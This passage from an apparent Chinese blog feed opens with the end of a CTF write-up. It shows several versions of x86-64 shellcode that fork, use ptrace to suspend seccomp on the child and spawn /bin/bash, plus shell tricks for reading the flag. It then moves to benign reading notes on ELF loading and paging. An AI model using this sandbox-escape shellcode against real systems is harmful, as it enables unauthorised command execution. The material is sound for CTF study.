class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">    mov rax, <span class="number">57</span></span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax</span><br><span class="line">    mov r15, rax</span><br><span class="line">    jz child_process</span><br><span class="line"></span><br><span class="line">parent_process:</span><br><span class="line">    mov rax, <span class="number">7</span></span><br><span class="line">    mov rdi, r15</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">257</span></span><br><span class="line">    mov rdi, <span class="number">16</span></span><br><span class="line">    mov rsi, r15</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">257</span></span><br><span class="line">    mov rdi, <span class="number">0x42000003</span></span><br><span class="line">    mov rsi, r15</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">257</span></span><br><span class="line">    mov rdi, <span class="number">0x7</span></span><br><span class="line">    mov rsi, r15</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">60</span></span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">child_process:</span><br><span class="line">    mov rax, <span class="number">257</span></span><br><span class="line">    mov rdi, <span class="number">0</span></span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">59</span></span><br><span class="line">    push <span class="number">0</span></span><br><span class="line">    push <span class="number">0</span></span><br><span class="line">    mov rbx, <span class="number">0x68732f6e69622f</span></span><br><span class="line">    push rbx</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">60</span></span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure><p>如果只是这样shellcode没有达到想要的结果<img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726211709806-93e54516-2188-475d-b6d6-26cbd6a1af77.png" alt="img"></p><p>因为我们的TRACEME和ATTCH实际上取得的是同一个效果，我看Qanux爷的exp，它让子进程sleep了一段时间，我们据此进行改进</p><h3 id="shellcode-v-2"><a href="#shellcode-v-2" class="headerlink" title="shellcode v.2"></a>shellcode v.2</h3><p>实际上对子进程的监测和管理都是放在一个死循环里的，我们得往shellcode代码里面加一个死循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pid = fork()</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!pid)</span><br><span class="line">    &#123;<span class="comment">//子进程</span></span><br><span class="line">        nanosleep(&amp;[<span class="number">5</span>,<span class="number">1</span>],<span class="number">0</span>)</span><br><span class="line">        execve(<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//父进程</span></span><br><span class="line">        waitpid(pid,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        ptrace(PTRACE_ATTACH,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">        ptrace(PTRACE_O_SUSPEND_SECCOMP,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">        ptrace(PTRACE_CONT,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的shellcode如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">    mov rax, <span class="number">57</span></span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax</span><br><span class="line">    mov r15, rax</span><br><span class="line">    jz child_process</span><br><span class="line"></span><br><span class="line">parent_process:</span><br><span class="line">    mov rax, <span class="number">7</span></span><br><span class="line">    mov rdi, r15</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">101</span></span><br><span class="line">    mov rdi, <span class="number">16</span></span><br><span class="line">    mov rsi, r15</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">monitor_child:</span><br><span class="line">    mov rax, <span class="number">101</span></span><br><span class="line">    mov rdi, <span class="number">0x42000003</span></span><br><span class="line">    mov rsi, r15</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">101</span></span><br><span class="line">    mov rdi, <span class="number">0x7</span></span><br><span class="line">    mov rsi, r15</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    syscall</span><br><span class="line">jmp monitor_child</span><br><span class="line"></span><br><span class="line">child_process:</span><br><span class="line">    mov rax,<span class="number">35</span></span><br><span class="line">    push <span class="number">1</span></span><br><span class="line">    dec byte ptr [rsp]</span><br><span class="line">    push <span class="number">5</span></span><br><span class="line">    mov rdi,rsp</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    mov rax, <span class="number">59</span></span><br><span class="line">    mov rbx, <span class="number">0x68732f6e69622f</span></span><br><span class="line">    push rbx</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    jmp child_process</span><br><span class="line">    mov rax, <span class="number">60</span></span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726212749197-6b4ebf41-fb80-4677-a0a3-5d0bfe0553e9.png" alt="img"></p><p>虽然是有shell的提示但是输入指令是没有回显的，比如echo *都没有回显</p><h3 id="shellcode-v-3"><a href="#shellcode-v-3" class="headerlink" title="shellcode v.3"></a>shellcode v.3</h3><p>再次对比Qanux的exp，发现用的是&#x2F;bin&#x2F;bash\x00。</p><p>然后发现wait是在PTRACE_ATTACH之后才调用的，调整下顺序，果然出了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">order2 = b<span class="number">&#x27;</span>h\x00<span class="number">&#x27;</span>[::<span class="number">-1</span>].hex()</span><br><span class="line">order1 = b<span class="number">&#x27;</span>/bin/bas<span class="number">&#x27;</span>[::<span class="number">-1</span>].hex()</span><br><span class="line">shellcode=<span class="keyword">asm</span>(f<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    mov rax, 57</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    test rax,rax</span></span><br><span class="line"><span class="string">    mov r15, rax</span></span><br><span class="line"><span class="string">    cmp rax, 0</span></span><br><span class="line"><span class="string">    je child_process</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">parent_process:</span></span><br><span class="line"><span class="string">    mov rax, 101</span></span><br><span class="line"><span class="string">    mov rdi, 16</span></span><br><span class="line"><span class="string">    mov rsi, r15</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rax, 61</span></span><br><span class="line"><span class="string">    mov rdi, r15</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    xor r10,r10</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">monitor_child:</span></span><br><span class="line"><span class="string">    mov rax, 101</span></span><br><span class="line"><span class="string">    mov rdi, 0x4200</span></span><br><span class="line"><span class="string">    mov rsi, r15</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov r10, 0x00000080</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 101</span></span><br><span class="line"><span class="string">    mov rdi, 0x7</span></span><br><span class="line"><span class="string">    mov rsi, r15</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">jmp monitor_child</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">child_process:</span></span><br><span class="line"><span class="string">    mov rax,35</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    dec byte ptr [rsp]</span></span><br><span class="line"><span class="string">    push 5</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rax, 59</span></span><br><span class="line"><span class="string">    mov rbx,0x&#123;order2&#125; </span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rbx, 0x&#123;order1&#125; </span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    jmp child_process</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rax, 60</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>对应的伪代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pid = fork()</span><br><span class="line">ptrace(PTRACE_ATTACH,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">waitpid(pid,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!pid)</span><br><span class="line">    &#123;<span class="comment">//子进程</span></span><br><span class="line">        ptrace(PTRACE_TRACEME,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        execve(<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//父进程</span></span><br><span class="line">        ptrace(PTRACE_SETOPTIONS,pid,<span class="number">0</span>,PTRACE_O_SUSPEND_SECCOMP)</span><br><span class="line">        ptrace(PTRACE_CONT,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726214096416-98d3111d-f787-43c9-9d9c-0f0766b4dae1.png" alt="img"></p><p>在Q爷文章中最后提到，给出的shell并没有ls和cat的功能，但是可以用对应代码代替</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># ls</span></span><br><span class="line">echo *</span><br><span class="line"></span><br><span class="line"><span class="meta"># cat flag</span></span><br><span class="line"><span class="keyword">while</span> IFS = read -r line; </span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    echo <span class="string">&quot;$line&quot;</span></span><br><span class="line">done &lt; flag</span><br></pre></td></tr></table></figure><p>最后</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726214453067-8e33a529-ea32-4953-bdab-46d9de921250.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> ctf知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进程 </tag>
            
            <tag> 二进制知识 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《程序员自我修养-链接、装载与库》第六章 可执行文件的装载与进程 读书笔记</title>
      <link href="/2024/03/29/%E3%80%8A%E7%A8%8B%E5%BA%8F%E5%91%98%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93%E3%80%8B%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E8%A3%85%E8%BD%BD%E4%B8%8E%E8%BF%9B%E7%A8%8B-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/03/29/%E3%80%8A%E7%A8%8B%E5%BA%8F%E5%91%98%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93%E3%80%8B%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E8%A3%85%E8%BD%BD%E4%B8%8E%E8%BF%9B%E7%A8%8B-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>可执行文件只有装载到内存以后才能被CPU执行，早起装载基本上就是把程序从外部存储器读取到内存中某个位置。但是硬件MMU诞生，多进程，多用户，虚拟存储的操作系统，装载过程变得复杂起来。</p><p>作者介绍在ELF文件在linux下的装载过程。来为我们解答一些问题。</p><p><strong>首先什么是进程的虚拟地址空间？</strong></p><p><strong>为什么进程要有自己独立的虚拟地址空间？</strong></p><p>我们从历史的角度来看看装载的几种方式，包括覆盖装载、页映射。</p><p>接着还会介绍进程虚拟地址空间的分布情况。</p><h1 id="6-1-进程虚拟地址空间"><a href="#6-1-进程虚拟地址空间" class="headerlink" title="6.1 进程虚拟地址空间"></a>6.1 进程虚拟地址空间</h1><p>程序是一个静态的概念，进程是一个动态的概念。程序是一道菜谱，进程便是炒菜的一个过程。</p><p>我们知道每个程序运行起来以后，拥有自己的虚拟地址空间。其由CPU的位数决定。</p><p>硬件决定了地址空间的最大理论上限，即硬件的寻址空间大小。</p><p>32位就0<del>2^31-1，即0x00000000</del>0xffffffff，也就是4GB；而64位则64位寻址能力，即2^64字节，即17179869184GB，看似是无限的，但是实际上在未来的一段时间后，我们也会觉得这个地址不够用。</p><p><strong>那么在32位的4GB空间中，我们程序是否可以任意使用？</strong></p><p>很遗憾，并不可以。因为操作系统还要监管程序运行，我们要给其分配一段空间。</p><p>Linux操作系统将进程的虚拟地址空间做了如图分配</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1711442516836-73099559-d1d8-4dc8-afd9-428362c817d4.webp" alt="img"></p><p>我们只看左边，4gb被分成了两部分，用户和内核地址。原则上说我们最多用3GB的虚拟空间，但是在现代程序中，明显这是不够用的（这里不是讲64位，而是依然是32位，虽然64位才是一本万利的选择）。PAE机制能够让我们在32位下使用超过4GB的内存空间。这点我们后面会说。</p><p>Window则2gb&#x2F;2gb这样分，也可以让操作系统占用的内存空间减少到1GB，在windows系统盘根目录下的Boot.ini加个“&#x2F;3g”参数</p><h2 id="PAE"><a href="#PAE" class="headerlink" title="PAE"></a>PAE</h2><p>从硬件层面来讲，Inter将32位地址线拓展到36位之后，修改了页映射的，这样可以访问更多的物理地址。这个扩展方式就叫做PAE。</p><p><strong>那么应用程序该如何使用这些大于常规的内存呢？</strong></p><p>一个很常见的方法是窗口映射，比如一段256MB的空间（0x10000000-20000000），程序可以从高于4GB的物理空间中多申请多个大小为256MB的物理空间，编号为A,B,C,D等，然后将这个窗口映射到不同的物理块，用到A时将0x10000000~0x20000000映射到A，用到B，C再映射到B,C对应的物理地址上去。</p><p>windows下，这种访问内存的操作方式叫做AWE（address windowing Extensions）；Linux则用mmap()系统调用来实现。</p><p>当然这只是一种补救措施罢了。</p><h1 id="6-2-装载的方式"><a href="#6-2-装载的方式" class="headerlink" title="6.2 装载的方式"></a>6.2 装载的方式</h1><p><strong>程序在装载时拥有局部性原理</strong>，如果一股脑把程序全部丢进内存，那很明显是不够用的。而且内存很贵，增加内存也是不现实的。因此我们可以把常用的部分留在内存，不常用的放在磁盘，这就是动态装入的基本原理。</p><p>覆盖装入和页映射是两种典型的装载方式，这里我们来介绍。</p><h2 id="覆盖装入"><a href="#覆盖装入" class="headerlink" title="覆盖装入"></a>覆盖装入</h2><p>覆盖装入在没有发明虚拟存储之前使用比较广泛，现在已经淘汰了。但是它的一些思想还是很有意义的。</p><p>在一些现代嵌入式的内存受限环境下，特别是诸如DSP等，这种方法或许还有用武之地。</p><p>覆盖装入把挖掘内存潜力的任务交给了程序员，程序员在编写程序时要把其分成若干块，然后编写一个小小的辅助代码（覆盖管理器）来管理这些模块应该何时驻留内存之中，何时被替换掉。</p><p>最简单的情况下，一个main模块会调用到模块A和模块B，但是AB之间没有相互调用的关系。假设这三个模块的大小分别为1024,512,256字节。不考虑内存对齐，装载地址限制的情况下，理论上运行这个程序需要有1792个字节的内存。此时在内存中应该这样安排。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1711443804520-75898888-25ff-4c0e-a297-6e488bb495d1.png" alt="img"></p><p>由于AB之间没有相互调用的依赖关系，因此可以相互覆盖。这样就省下了一些字节。</p><p>所以程序要把这些模块手动分成一个树状结构来表示其调用依赖关系。但是要注意两点：</p><ol><li><ol><li>这个树状结构中从任意一个模块到树的根的模块都叫调用路径。调用路径上的模块必须保存在内存中，如main-&gt;A-&gt;D。</li><li>禁止跨树间调用</li></ol></li></ol><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1711443927274-ef1fa4b3-9dbe-4042-acf0-258652a0f712.png" alt="img"></p><p>当然跨模块间的调用要经过覆盖管理器，以确保所有被调用的模块都能够驻留在内存。</p><p>覆盖装入的速度肯定还是比较慢的。</p><h2 id="页映射"><a href="#页映射" class="headerlink" title="页映射"></a>页映射</h2><p>它是虚拟存储机制的一部分，由其发明而诞生。这里我们结合可执行文件的装载来阐述一下页映射是如何应用到动态装载中去的。</p><p>页映射将磁盘中数据和指令按照“页”为单位划分为若干个页。硬件规定页的大小有4096字节、8192字节、2MB、4MB等。InterA32一般使用4096字节的页。</p><p>假设我们有如下页，有16KB大小内存，这些页的大小为4KB。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1711445006885-36419e1a-3c74-4c16-b8cd-06c046c88b00.png" alt="img"></p><p>如果我们的程序是P0~P7有32KB的程序，我们16KB空间显然无法直接装入。</p><p>假设程序刚开始执行时的入口地址在P0，这时装载管理器（假设控制装载的叫这个名字）会把F0分配给P0，然后运行一段时间需要用到其他程序的页，如P5,P3,P6，会将P5分配到F1，P3分配到F2，P6分配到F3。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1711445011172-1727b70b-259c-42bd-b739-7554a6470f6d.png" alt="img"></p><p>那么此时应该占满了16KB的内存了吧。如果还要装入P4，那么装载器必须做出选择，舍弃哪个页来装入。</p><p>我们有很多算法来决定选择哪个页，比如FIFO算法，或者最少使用算法LUA。</p><p>很多人可能猜到了，这个所谓的装载器其实就是我们的操纵系统，更精确的说，是它的存储管理器。目前几乎所有主流的操作系统都是按照这种方式装载的。</p><h1 id="6-3-从操作系统角度看可执行文件的装载。"><a href="#6-3-从操作系统角度看可执行文件的装载。" class="headerlink" title="6.3 从操作系统角度看可执行文件的装载。"></a>6.3 从操作系统角度看可执行文件的装载。</h1><p>可执行文件中的页可以被装入任意页，从上面的页映射的动态装入的方式可以看到。</p><p>如果程序使用物理地址直接进行操作，那么每次页被装入时都需要进行重定位。</p><p>在虚拟存储中，现代硬件的MMU地址都提供地址转换的功能。有了硬件的地址转换和页映射机制，操作系统动态加载和静态加载有很大区别。本节我们将站在一个操作系统的角度来看可执行文件的装载。</p><h2 id="进程的建立"><a href="#进程的建立" class="headerlink" title="进程的建立"></a>进程的建立</h2><p><strong>从操作系统角度看，一个进程最关键的特征是它拥有独立的虚拟地址空间。</strong></p><p>创建一个进程，然后装载相应的可执行文件并且执行，在有虚拟存储的情况下，上述过程最开始只需要做三件事情：</p><ol><li>创建一个独立的虚拟地址空间</li><li>读取可执行文件头，并且建立虚拟空间与可执行文件的映射关系。</li><li>将CPU的指令寄存器设置成可执行文件的入口地址，启动并运行。</li></ol><h3 id="创建虚拟空间"><a href="#创建虚拟空间" class="headerlink" title="创建虚拟空间"></a>创建虚拟空间</h3><p>一个虚拟空间由一组映射函数将虚拟空间的页映射到物理空间，<strong>创建虚拟空间</strong>不是创建映射函数，而<strong>是创建对应的数据结构</strong>。在i386Linux下，创建虚拟空间实际上只是分配一个页目录，甚至不需要设置映射关系，这些映射关系等到后面程序发生页错误再进行设置。</p><p>感觉有点绕？听不懂？不急，后面会解释</p><p>这里是 虚拟空间映射到物理空间 的过程</p><h3 id="建立虚拟空间和可执行文件的映射"><a href="#建立虚拟空间和可执行文件的映射" class="headerlink" title="建立虚拟空间和可执行文件的映射"></a>建立虚拟空间和可执行文件的映射</h3><p>这一步做的是虚拟空间和可执行文件的映射关系。有一个机制：当程序执行发生页错误时，操作系统从物理内存分配一个物理页，然后将此页从磁盘读取到内存中，再设置虚拟页和物理页的映射关系，这样程序才能正常的运行。那么这个机制就有一个问题，它是如何知道缺页错误的程序所需要的页在可执行文件的哪个位置？这就是可执行文件和虚拟空间的映射关系。从某种角度来看，这一步是整个装载过程中最重要的一步，也是传统意义上”装载”的过程。</p><p>可执行文件也被叫做映像文件。</p><p>考虑最简单的情况</p><h3 id="设置可执行文件入口"><a href="#设置可执行文件入口" class="headerlink" title="设置可执行文件入口"></a>设置可执行文件入口</h3><p>第三步也是最简单的一步，操作系统通过设置CPU的指令寄存器将控制权移交给进程，然后进程开始执行。这一步看似简单，实际上在操作系统层面比较复杂，它涉及到内核堆栈和用户堆栈的切换、CPU运行权限的切换。不过从进程的角度来看这一步可以简单的认为操作系统执行了一条跳转指令。其实也就是ELF文件头保存的入口地址。</p><h2 id="页错误"><a href="#页错误" class="headerlink" title="页错误"></a>页错误</h2><p>上面步骤完成后，可执行文件的指令和数据都没有装入到内存中。操作系统只是通过可执行文件头部信息建立起可执行文件和进程虚拟内存的联系罢了。</p><p>假设程序的入口是0x08048000，即刚好是.text段的起始地址，当CPU执行命令时，会发现这是个空页面，于是会产生页错误。CPU将控制权交给操作系统，操作系统通过页错误处理机制来处理，然后通过装载过程第二步建立的数据结构来找到空页面所在的VMA（虚拟内存），计算出相应页面的偏移，然后分配一个物理内存页面，建立虚拟页和分配的物理页的映射关系。</p><p>随着进程执行，页错误不断产生，程序也不断“补全”</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1711789734907-7ce5741e-6aca-47b0-869e-88018e87f3ce.png" alt="img"></p><h1 id="6-4-进程虚存空间分布"><a href="#6-4-进程虚存空间分布" class="headerlink" title="6.4 进程虚存空间分布"></a>6.4 进程虚存空间分布</h1><h3 id="ELF文件链接视图和执行视图"><a href="#ELF文件链接视图和执行视图" class="headerlink" title="ELF文件链接视图和执行视图"></a>ELF文件链接视图和执行视图</h3><p>如果我们按照链接时的节（Section）一一映射成一个页的整数倍，那么浪费的内存是可想而知的。</p><p>操作系统只关心装载相关的问题，最主要的是段（Section）的权限，这些权限往往只有几种组合。</p><p>基本上是这三种</p><ol><li>以代码段为代表的可读可执行段</li><li>以数据段和bss段为代表的可读可写段</li><li>以只读数据为代表的只读段。</li></ol><p>对于权限相同的段，我们可以把他们合成到一个段（Segment）进行映射</p><p>（Segment）和（Section）都可以是段，但是他们是不同视图下的说法，（Section）是链接视图，（Segment）是装载执行视图</p><p>ELF可执行文件有个程序头表，用来保存（Segment）信息。</p><p>目标文件没有头表，因为它不需要被装载。而ELF可执行文件和共享库文件都有。</p><p>头表结构体</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1711790314095-b733652c-1d7a-48a0-a2f3-ec37ad2112b6.jpeg" alt="img"></p><p>各个成员基本含义</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1711790346659-323dfd64-81c9-4a7e-b42e-1f7d81e4c668.png" alt="img"></p><h2 id="堆和栈"><a href="#堆和栈" class="headerlink" title="堆和栈"></a>堆和栈</h2><p>做多点x86和x64的题，大概能看出点规律，这里不做总结了。</p><p>还有个很特殊的VMA叫做“vdso”，它的地址已经位于内核空间（即大于0XC0000000）的地址。</p><p>操作系统通过给进程空间划分出一个个VMA来管理进程的虚拟空间；基本原则是将相同属性、相同映像文件的映射成一个VMA，一个进程基本上可以分为如下几种VMA区域：</p><ol><li>代码VMA，权限只读、可执行；有映像文件</li><li>数据VMA，权限可读可写，有映像文件</li><li>堆VMA，权限可读写、可执行（应该大多数不可以？）；无映像文件，匿名，向上拓展</li><li>栈VMA，权限可读写，不可执行；无映像文件，匿名，向下拓展</li></ol><p><img 